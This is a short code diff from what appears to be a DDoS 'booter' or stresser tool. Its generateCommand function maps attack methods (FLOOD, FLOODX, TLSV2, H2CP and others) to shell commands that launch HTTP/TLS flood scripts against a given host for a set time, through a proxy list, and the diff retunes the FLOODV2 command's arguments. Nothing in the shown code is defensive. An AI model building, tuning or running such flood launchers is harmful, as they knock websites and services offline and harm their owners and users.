@@ -34,7 +34,7 @@ function generateCommand(method, host, time) {
     case 'TLSV4':     return `node tlsv4.js ${host} ${time} 50 8`;
     case 'FLOOD':     return `node flood.js ${host} ${time} 50 4 proxy.txt`;
     case 'FLOODX':    return `node floodx.js ${host} ${time} 8 3 proxy.txt`;
-    case 'FLOODV2':   return `node m-flood.js GET ${host} ${time} 4 64 proxy.txt --full`;
+    case 'FLOODV2':   return `node m-flood.js ${host} ${time} 32 4 proxy.txt --full`;
     case 'LEGIT':     return `node legit.js GET ${host} ${time} 2 8 proxy.txt`;
     case 'TLSV2':     return `node tlsv2.js ${host} ${time} 64 4 proxy.txt`;
     case 'H2CP':     return `/flh ${host} ${time} 32 4 proxy.txt --poison`;
